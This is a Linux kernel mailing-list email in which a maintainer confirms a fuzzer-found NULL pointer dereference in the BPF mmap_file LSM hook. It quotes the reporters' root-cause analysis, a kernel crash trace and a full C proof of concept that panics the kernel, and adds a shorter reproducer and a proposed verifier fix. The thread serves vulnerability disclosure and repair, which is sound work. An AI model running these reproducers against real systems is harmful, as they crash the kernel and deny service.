Return-Path: <bpf+bounces-75870-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 39129C9B308
	for <lists+bpf@lfdr.de>; Tue, 02 Dec 2025 11:39:11 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id E6D803A1A44
	for <lists+bpf@lfdr.de>; Tue,  2 Dec 2025 10:39:09 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9879130E854;
	Tue,  2 Dec 2025 10:39:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="gSzONtbP"
X-Original-To: bpf@vger.kernel.org
Received: from mail-ej1-f50.google.com (mail-ej1-f50.google.com [209.85.218.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DB291204583
	for <bpf@vger.kernel.org>; Tue,  2 Dec 2025 10:39:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.218.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764671946; cv=none; b=AgQxsPC7suiltD8AYrfH/IWqdqYew9hHWVhYUTEPVVZjdRD8015zbyTyWCM6ywtGIR518xepV4nGJkG6SA3E6vcTSkf/1CbOgOcoBk7/XGtJHdptcgQNg/HeaBn6tQHT0XXPyZzjg1Wf7f5TuT3ZIauL4NMJ2Nb6VTwmOJM+2Gw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764671946; c=relaxed/simple;
	bh=Fgi5oW1z56wEFPdEtFTdfKJBQDfqORRKh+S1H6yrxEw=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=RKQuN8nQVl+YmKd15mQk2HTdyLyoxS8dowF1a0jsRd0MomnFdTTArCfvGlFaXifp59gdLqkkQufdIu/ASZJKHYag7n9yk6mqPl8k7AAbouM0v3v31hyaCRD9UNEC8pB/o+2DW5F4FikuEMI+Ew3nyQwwOlO29Lrx3JvxNwJ0kmA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=gSzONtbP; arc=none smtp.client-ip=209.85.218.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Received: by mail-ej1-f50.google.com with SMTP id a640c23a62f3a-b7636c96b9aso726704266b.2
        for <bpf@vger.kernel.org>; Tue, 02 Dec 2025 02:39:02 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1764671941; x=1765276741; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=zuGkQ26Pv53IJE9K5UaZplvq612MGaLV34Qevb26LNY=;
        b=gSzONtbPm9vL8yWMEhfeBfvAqQOx4AFB85IspswPbAMF0rYv2kgzic4GBkkIHljQJi
         0igHSs2BnYIYiNY1SFgFHgDBRzAmx8WKeELP2qMNkrVdFWmlGjNN9i7xYeGWrCtD6alm
         bQcdtwJsc5gGY7anQFPQeowUfG0HR1dZhEfGSykq9SggeLpO6ITOcKGVtoxPvi73PjUF
         /WdEaW2HDoIJDsaxZdLXeMP0oHxhKXmKfNSJGwBKJYrk8/V44r7zJ1r9INr0CM28KydN
         IbnaQZYJn+J0NG4n3qPGOURHyyoRlUOvFa0baheELqBTLtcbEdUmgnba29EVHCd+BQiO
         q5Fw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764671941; x=1765276741;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=zuGkQ26Pv53IJE9K5UaZplvq612MGaLV34Qevb26LNY=;
        b=N9WZSQju1wi6B1NiQBw1E/BXo1Valep73xsJld3Ea0xxQoKjRvtSFN91CqoQnQH+kC
         ztECGWxq0pNsVefP9r61RVON/ugeRFt+RDVEv9UCGGroSCZcRJvHM2aPx5YRx8FYuNVM
         0d6pwTnHqeY397Pl22e81fzJoQzRKAGTOTtQb6dUWK2IpNu9IoUpKa/UK4lz+AmmZQCI
         7ZpcS4KGhlRZSq43VCCWviRbBH0IU+HjKQ6xtj+tZOErz5/xJTTPQXjT3a4f3o7RH1xf
         p0vjQ5BihSbCaKmR2IogQBqP3eHvylFisAqBvTsajSU6gK6ssZS7K3tWZ+b0KKPZPjXy
         ReTg==
X-Forwarded-Encrypted: i=1; AJvYcCV3n3KLHhfl+E/ZFDLzs/tC0KTNVL/i3NCQbsNR+Xj6DmF9j+wsq/QAFNrksHx7REZWDPU=@vger.kernel.org
X-Gm-Message-State: AOJu0Yz9Rb575LXak8jAPM/O9Zmr/Cr7iCqQvlE9jsGX7tYRpVslKp2s
	RGBT07WUlMH61n9bZKEby1dvKmpVYVLGv+ETznQccsPanBzDKaIl+Fg4D7JkYQz6YA==
X-Gm-Gg: ASbGncuk3cyhIQLyei7iV7Xt56HEB/QLt0fS6xQdocBsdzuCaVrj+vui2JCshGXClX4
	VpYetXyP/ztvNwL+3jJfpsBTeGBRHdFtYAlQl3GQX3s8YVWWIddqvYQVAjou8StuKNdFcOyTC3s
	s9QABrwK0boD3lRSpvow8E3CJiN9v5wcA5zcCXxvpm4AarBWOdpwRDyilRKA5dZFx6EgcYo5ORl
	4qk426t4iiSNi+Q6q3UrOTbFeHbFi31wd2i7yUlzh8A4mrQ4p/yRwgyxh5YzQNTECeJTTSAFoCO
	3uLECqx0FmiQlTi4H66ZE/pPBZKXnzz2MHm4HUXczwf0YTnQjzOEXFx2b0Jtsyw3wvDeuBpUI88
	3dYPWGeTGfxt0pvc8WQ/PiTWd2QWflX5L6SPEgTFLQn8SseH3FR5TeTQMRwiAWZk+Lr0JmEMcub
	RUL7Rs8y6x4X2BvgrIAAbLcazpMw8yKbzynch3YzYmDwLoubuETmwSuQ7EUHXy3dbD/KY=
X-Google-Smtp-Source: AGHT+IFQ3r6444SB3HqDZDhm52wOB+J0d7QT1GPlU236Id9tBd9RZnpD3Mdg8nMEY5c+eLMtpca3lQ==
X-Received: by 2002:a17:907:9289:b0:b73:5a8b:c9af with SMTP id a640c23a62f3a-b767184bcafmr4926341366b.42.1764671940933;
        Tue, 02 Dec 2025 02:39:00 -0800 (PST)
Received: from google.com (49.185.141.34.bc.googleusercontent.com. [34.141.185.49])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-b76f5a3a4ebsm1481161066b.62.2025.12.02.02.39.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 02 Dec 2025 02:39:00 -0800 (PST)
Date: Tue, 2 Dec 2025 10:38:55 +0000
From: Matt Bobrowski <mattbobrowski@google.com>
To: =?utf-8?B?5qKF5byA5b2m?= <kaiyanm@hust.edu.cn>
Cc: daniel@iogearbox.net, bpf@vger.kernel.org, martin.lau@linux.dev,
	hust-os-kernel-patches@googlegroups.com, dddddd@hust.edu.cn,
	dzm91@hust.edu.cn, kpsingh@kernel.org
Subject: Re: bpf: mmap_file LSM hook allows NULL pointer dereference
Message-ID: <aS7BvzTJ-2Xo7ncq@google.com>
References: <5e460d3c.4c3e9.19adde547d8.Coremail.kaiyanm@hust.edu.cn>
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <5e460d3c.4c3e9.19adde547d8.Coremail.kaiyanm@hust.edu.cn>

On Tue, Dec 02, 2025 at 03:09:42PM +0800, 梅开彦 wrote:
> Our fuzzer tool discovered a NULL pointer dereference vulnerability in the BPF subsystem. The vulnerability is triggered when a BPF LSM program, attached to the `bpf_lsm_mmap_file`, receives a NULL pointer for the `struct file *` argument during an anonymous memory mapping operation but attempts to dereference it without a NULL check.
> 
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
> 
> ## Root Cause
> 
> The crash is caused by a NULL pointer dereference within an eBPF program attached to the `bpf_lsm_mmap_file` LSM hook. The trigger occurs when a user calls the `mmap` syscall with the `MAP_ANONYMOUS` flag. This action creates a file-less memory mapping, causing the kernel to invoke the `security_mmap_file` hook with a NULL `struct file *` argument. If the attached BPF program assumes this pointer is always valid and attempts to dereference it without a NULL check, it immediately causes a page fault, leading to a kernel panic.

Thanks for the report. Can confirm, and a more simplified reproducer
can be found below:

BPF:
```
SEC("lsm.s/mmap_file")
int BPF_PROG(mmap_file, struct file *file)
{
        bpf_printk("i_ino=%llu", file->f_inode->i_ino);
        return 0;
}
```

Stimulus:
```
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main(int argc, char** argv) {
  void* p;

  p = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (p == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  memset(p, 0, 4096);
  munmap(p, 4096);
  return 0;
}
```

My initial thought here is that bpf_lsm_is_trusted() is treating
pointer arguments provided to security_mmap_file() simply as
PTR_TRUSTED, when in reality it should be something like PTR_TRUSTED |
PTR_MAYBE_NULL instead. Anyway, I can take a look and send through an
appropriate fix.

> #### Execution Flow Visualization
> 
> ```
> Vulnerability Execution Flow
> |
> |--- 1. An unsafe BPF program (without a NULL check) is attached
> |    |   to the `bpf_lsm_mmap_file` LSM hook.
> |
> |--- 2. `mmap(..., MAP_ANONYMOUS, -1, ...)` Syscall Execution
> |    |
> |    `-- ... -> vm_mmap_pgoff()
> |        |
> |        `-- security_mmap_file(file=NULL, ...)
> |            |
> |            |--> Calls the attached BPF program via trampoline.
> |            |
> |            `-- BPF Program Execution
> |                |
> |                |--> Receives `file` argument as a NULL pointer.
> |                |
> |                `-- Unsafely dereferences the NULL pointer.
> |                    |
> |                    `-> CRASH: NULL pointer dereference occurs here.
> ```
> 
> ### Reproduction Steps
> 
> 1.  **Map Creation**: Create a BPF map of type `BPF_MAP_TYPE_INODE_STORAGE`.
> 2.  **Program Setup**: Load a `BPF_PROG_TYPE_LSM` BPF program. The program must be written to dereference its first argument (a `struct file *` context pointer).
> 3.  **Link Creation**: Attach the LSM program to the `bpf_lsm_mmap_file` hook via its BTF ID.
> 4.  **Trigger**: Call `mmap` with the `MAP_ANONYMOUS` flag and an `fd` of `-1`. This will pass a `NULL` `struct file *` pointer to the BPF program, causing the kernel to crash.
> 
> ## KASAN Report
> 
> ```
> [  680.827306][T11558] BUG: kernel NULL pointer dereference, address: 0000000000000060
> [  680.827714][T11558] #PF: supervisor read access in kernel mode
> [  680.827977][T11558] #PF: error_code(0x0000) - not-present page
> [  680.828291][T11558] PGD 0 P4D 0 
> [  680.828469][T11558] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
> [  680.828763][T11558] CPU: 1 UID: 0 PID: 11558 Comm: poc Not tainted 6.18.0-rc7-next-20251128 #9 PREEMPT(full) 
> [  680.829279][T11558] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> [  680.829753][T11558] RIP: 0010:bpf_prog_7fbc899361679885+0x19/0x45
> [  680.830085][T11558] Code: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc f3 0f 1e fa 0f 1f 44 00 00 0f 1f 00 55 0
> [  680.831092][T11558] RSP: 0018:ffffc90008e0fd00 EFLAGS: 00010202
> [  680.831405][T11558] RAX: 0000000000000001 RBX: 0000000000000001 RCX: ffffffff81e71ea9
> [  680.831821][T11558] RDX: ffff8880329d0000 RSI: ffffffff81e71d9e RDI: 0000000000000000
> [  680.832230][T11558] RBP: ffffc90008e0fd08 R08: 0000000000000000 R09: 0000000000000001
> [  680.832636][T11558] R10: 0000000000000001 R11: 0000000000000001 R12: 0000000000000000
> [  680.833046][T11558] R13: 0000000000000000 R14: 0000000000000032 R15: ffff888113f98000
> [  680.833452][T11558] FS:  00007f86f38a9740(0000) GS:ffff8881a13de000(0000) knlGS:0000000000000000
> [  680.833918][T11558] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  680.834265][T11558] CR2: 0000000000000060 CR3: 000000010e12a000 CR4: 0000000000752ef0
> [  680.834679][T11558] PKRU: 55555554
> [  680.834868][T11558] Call Trace:
> [  680.835044][T11558]  <TASK>
> [  680.835203][T11558]  bpf_trampoline_6442622653+0x64/0x10d
> [  680.835494][T11558]  security_mmap_file+0x8b1/0x9f0
> [  680.835765][T11558]  vm_mmap_pgoff+0xd9/0x460
> [  680.836010][T11558]  ? __pfx_vm_mmap_pgoff+0x10/0x10
> [  680.836285][T11558]  ksys_mmap_pgoff+0x82/0x5d0
> [  680.836533][T11558]  ? __pfx_ksys_write+0x10/0x10
> [  680.836794][T11558]  __x64_sys_mmap+0x12c/0x190
> [  680.837055][T11558]  do_syscall_64+0xcb/0xf80
> [  680.837303][T11558]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [  680.837613][T11558] RIP: 0033:0x7f86f39ad7d9
> [  680.837850][T11558] Code: 08 89 e8 5b 5d c3 66 2e 0f 1f 84 00 00 00 00 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 8
> [  680.838856][T11558] RSP: 002b:00007ffdc27f0ee8 EFLAGS: 00000212 ORIG_RAX: 0000000000000009
> [  680.839290][T11558] RAX: ffffffffffffffda RBX: 00007ffdc27f1098 RCX: 00007f86f39ad7d9
> [  680.839703][T11558] RDX: 0000000000000000 RSI: 0000000000001000 RDI: 0000200001000000
> [  680.840121][T11558] RBP: 00007ffdc27f0f60 R08: ffffffffffffffff R09: 0000000000000000
> [  680.840535][T11558] R10: 0000000000000032 R11: 0000000000000212 R12: 0000000000000000
> [  680.840942][T11558] R13: 00007ffdc27f10a8 R14: 000055be0fcbedd8 R15: 00007f86f3ace020
> [  680.841362][T11558]  </TASK>
> [  680.841525][T11558] Modules linked in:
> [  680.841733][T11558] CR2: 0000000000000060
> [  680.841951][T11558] ---[ end trace 0000000000000000 ]---
> [  680.842235][T11558] RIP: 0010:bpf_prog_7fbc899361679885+0x19/0x45
> [  680.842568][T11558] Code: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc f3 0f 1e fa 0f 1f 44 00 00 0f 1f 00 55 0
> [  680.843588][T11558] RSP: 0018:ffffc90008e0fd00 EFLAGS: 00010202
> [  680.843901][T11558] RAX: 0000000000000001 RBX: 0000000000000001 RCX: ffffffff81e71ea9
> [  680.844310][T11558] RDX: ffff8880329d0000 RSI: ffffffff81e71d9e RDI: 0000000000000000
> [  680.844723][T11558] RBP: ffffc90008e0fd08 R08: 0000000000000000 R09: 0000000000000001
> [  680.845140][T11558] R10: 0000000000000001 R11: 0000000000000001 R12: 0000000000000000
> [  680.845549][T11558] R13: 0000000000000000 R14: 0000000000000032 R15: ffff888113f98000
> [  680.845967][T11558] FS:  00007f86f38a9740(0000) GS:ffff8881a13de000(0000) knlGS:0000000000000000
> [  680.846429][T11558] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  680.846770][T11558] CR2: 0000000000000060 CR3: 000000010e12a000 CR4: 0000000000752ef0
> [  680.847180][T11558] PKRU: 55555554
> [  680.847362][T11558] Kernel panic - not syncing: Fatal exception
> [  680.847924][T11558] Kernel Offset: disabled
> ```
> 
> ## Proof of Concept
> 
> The following C program can demonstrate the vulnerability on linux-next-20251128(commit 7d31f578f3230f3b7b33b0930b08f9afd8429817).
> 
> To successfully run the PoC, you need to obtain the BTF ID for `bpf_lsm_mmap_file` and set the variable `btf_id` in function `load_prog` to this value. You can retrieve this BTF ID using the following command: `bpftool btf dump file path-to-your-vmlinux | grep bpf_lsm_mmap_file`.
> 
> ```c
> #define _GNU_SOURCE 
> 
> #include <dirent.h>
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <sys/ioctl.h>
> #include <time.h>
> #include <unistd.h>
> #include <linux/bpf.h>
> #include <sys/socket.h>
> #include <sys/mman.h>
> 
> #ifndef __NR_bpf
> #define __NR_bpf 321
> #endif
> 
> #define BPF_FUNC_inode_storage_get 145
> #define BPF_FUNC_inode_storage_delete 146
> 
> #define BPF_EXIT_INSN()						\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_JMP | BPF_EXIT,			\
> 		.dst_reg = 0,					\
> 		.src_reg = 0,					\
> 		.off   = 0,					\
> 		.imm   = 0 })
> 
> #define BPF_MOV64_IMM(DST, IMM)					\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
> 		.dst_reg = DST,					\
> 		.src_reg = 0,					\
> 		.off   = 0,					\
> 		.imm   = IMM })
> 
> #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
> 		.dst_reg = DST,					\
> 		.src_reg = SRC,					\
> 		.off   = OFF,					\
> 		.imm   = 0 })
>                 
> #define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2)	\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
> 		.dst_reg = DST,					\
> 		.src_reg = SRC,					\
> 		.off   = OFF1,					\
> 		.imm   = IMM1 }),				\
> 	((struct bpf_insn) {					\
> 		.code  = 0, /* zero is reserved opcode */	\
> 		.dst_reg = 0,					\
> 		.src_reg = 0,					\
> 		.off   = OFF2,					\
> 		.imm   = IMM2 })
> 
> /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
> 
> #define BPF_LD_MAP_FD(DST, MAP_FD)				\
> 	BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0,	\
> 			      MAP_FD, 0)
> 
> #define BPF_MOV64_REG(DST, SRC)					\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
> 		.dst_reg = DST,					\
> 		.src_reg = SRC,					\
> 		.off   = 0,					\
> 		.imm   = 0 })
> 
> #define BPF_EMIT_CALL(FUNC)					\
> 	((struct bpf_insn) {					\
> 		.code  = BPF_JMP | BPF_CALL,			\
> 		.dst_reg = 0,					\
> 		.src_reg = 0,					\
> 		.off   = 0,					\
> 		.imm   = ((FUNC) - BPF_FUNC_unspec) })
> 
> 
> static unsigned long long procid;
> static inline uint64_t ptr_to_u64(const void *ptr) {
>     return (uint64_t)(unsigned long)ptr;
> }
> 
> 
> int create_btf_fd(){
>     *(uint64_t*)0x200000000100 = 0x200000000000;
>     *(uint16_t*)0x200000000000 = 0xeb9f;
>     *(uint8_t*)0x200000000002 = 1;
>     *(uint8_t*)0x200000000003 = 0;
>     *(uint32_t*)0x200000000004 = 0x18;
>     *(uint32_t*)0x200000000008 = 0;
>     *(uint32_t*)0x20000000000c = 0x1c;
>     *(uint32_t*)0x200000000010 = 0x1c;
>     *(uint32_t*)0x200000000014 = 2;
>     *(uint32_t*)0x200000000018 = 0;
>     *(uint16_t*)0x20000000001c = 0;
>     *(uint8_t*)0x20000000001e = 0;
>     *(uint8_t*)0x20000000001f = 1;
>     *(uint32_t*)0x200000000020 = 4;
>     *(uint8_t*)0x200000000024 = 0x20;
>     *(uint8_t*)0x200000000025 = 0;
>     *(uint8_t*)0x200000000026 = 0;
>     *(uint8_t*)0x200000000027 = 1;
>     *(uint32_t*)0x200000000028 = 1;
>     *(uint16_t*)0x20000000002c = 0;
>     *(uint8_t*)0x20000000002e = 0;
>     *(uint8_t*)0x20000000002f = 0x10;
>     *(uint32_t*)0x200000000030 = 8;
>     *(uint8_t*)0x200000000034 = 0;
>     *(uint8_t*)0x200000000035 = 0;
>     *(uint64_t*)0x200000000108 = 0;
>     *(uint32_t*)0x200000000110 = 0x36;
>     *(uint32_t*)0x200000000114 = 0;
>     *(uint32_t*)0x200000000118 = 1;
>     *(uint32_t*)0x20000000011c = 0;
>     *(uint32_t*)0x200000000120 = 0;
>     *(uint32_t*)0x200000000124 = 0;
>     int res = syscall(__NR_bpf, /*cmd=*/0x12ul, /*arg=*/0x200000000100ul, /*size=*/0x28ul);
>     return res;
> }
> 
> int bpf_map_create(uint32_t map_type, uint32_t key_size, uint32_t value_size, unsigned int max_entries, unsigned int flags, unsigned int btf_id) {
>         union bpf_attr attr = {.map_type = map_type,
>         .key_size = key_size,
>         .value_size = value_size,
>         .max_entries = max_entries,
>         .map_flags = flags,
>         .map_extra = 0,
>         .btf_fd=btf_id,
>         .btf_key_type_id=1,
>         .btf_value_type_id=1,
>     };
>         return syscall(__NR_bpf, 0, &attr, 0x40);
> }
> 
> static int load_prog(struct bpf_insn *insns, size_t cnt) {
>     int btf_id = 0; // change to valid btf of bpf_lsm_mmap_file
>     if(btf_id == 0) {
>         printf("Btf id is not available! \n");
>         exit(0);
>     }
> 
>     union bpf_attr attr = {
>         .prog_type = 0x1d,
>         .insns = ptr_to_u64(insns),
>         .insn_cnt = cnt,
>         .license = ptr_to_u64("GPL"),
>         .attach_btf_id = btf_id, 
>         .expected_attach_type = BPF_LSM_MAC,
>         .log_level = 3,
>     };
>     int prog_fd=syscall(__NR_bpf, 5, &attr, sizeof(attr));
>     return prog_fd;
> }
> 
> int link_create(int prog_fd, int target_fd, uint32_t attach_type)
> {
>         union bpf_attr attr = {
>                 .link_create.prog_fd = prog_fd,
>                 .link_create.target_fd = target_fd,
>                 .link_create.attach_type = attach_type,
>         };
> 
>         return syscall(__NR_bpf, BPF_LINK_CREATE, &attr, sizeof(attr.link_create));
> }
> 
> uint64_t r[4] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
> 
> void execute_one(void)
> {
>         intptr_t res = 0;
>         if (write(1, "executing program\n", sizeof("executing program\n") - 1)) {}
> 
>         res = create_btf_fd();
>         if (res != -1)
>                 r[0] = res;
> 
>         res = bpf_map_create(0x1c, 4, 4, 0, 0x201, r[0]);
>         if (res != -1)
>                 r[1] = res;
>         struct bpf_insn prog[] = {
>             BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_1, 0),
>             BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 96), // dereference the struct file *
>             BPF_LD_MAP_FD(BPF_REG_1, r[1]),
>             BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
>             BPF_MOV64_IMM(BPF_REG_3, 0x0),
>             BPF_MOV64_IMM(BPF_REG_4, 0x1),
>             BPF_EMIT_CALL(BPF_FUNC_inode_storage_get),
>             BPF_MOV64_IMM(BPF_REG_0, 0x0),
>             BPF_EXIT_INSN()
>         };
>         res = load_prog(prog, sizeof(prog) / sizeof(prog[0]));
>         printf("loaded prog %ld\n", res);
>         if (res != -1)
>             r[3] = res;
>         int link = link_create(r[3], 0, BPF_LSM_MAC);
>         syscall(__NR_mmap, /*addr=*/0x200001000000ul, /*len=*/0x1000ul, /*prot=*/0ul, MAP_ANONYMOUS, /*fd=*/(intptr_t)-1, /*offset=*/0ul);
> }
> int main(void)
> {
>         syscall(__NR_mmap, /*addr=*/0x1ffffffff000ul, /*len=*/0x1000ul, /*prot=*/0ul, /*flags=MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=*/(intptr_t)-1, /*offset=*/0ul);
>         syscall(__NR_mmap, /*addr=*/0x200000000000ul, /*len=*/0x1000000ul, /*prot=PROT_WRITE|PROT_READ|PROT_EXEC*/7ul, /*flags=MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=*/(intptr_t)-1, /*offset=*/0ul);
>         syscall(__NR_mmap, /*addr=*/0x200001000000ul, /*len=*/0x1000ul, /*prot=*/0ul, /*flags=MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=*/(intptr_t)-1, /*offset=*/0ul);
>         for(int i=0;i<1;i++){
>                 execute_one();
>         }
>         
>         return 0;
> }
> 
> ```
> 
> 
> ## Kernel Configuration Requirements for Reproduction
> 
> The vulnerability can be triggered with the kernel config in the attachment.



